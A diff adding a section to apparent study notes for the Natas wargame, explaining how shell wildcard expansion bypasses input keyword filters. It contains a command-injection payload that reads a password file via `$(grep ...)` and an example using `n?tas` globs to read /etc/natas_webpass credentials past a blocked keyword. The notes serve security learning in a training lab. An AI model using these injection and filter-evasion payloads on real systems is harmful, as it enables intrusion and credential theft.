@@ -478,3 +478,21 @@ anythings$(grep ^PREFIX /etc/natas_webpass/natas17)
 2. Output (or empty string) is substituted
 3. Outer `grep` runs
 4. You observe outer grep’s output, not inner grep’s output
+
+## Shell Wildcard (Globbing) Bypass
+Linux shells expand **wildcards (globs)** *before* a command executes. Input filters often check raw text **before** this expansion.
+### Key Wildcards
+| Wildcard | Meaning                  |
+| -------- | ------------------------ |
+| `?`      | Exactly one character    |
+| `*`      | Any number of characters |
+| `[]`     | One character from a set |
+## Exploit Example
+Blocked keyword: `natas`
+```bash
+cat /etc/n?tas_webpass/n?tas30
+```
+Shell expands it to:
+```bash
+cat /etc/natas_webpass/natas30
+```
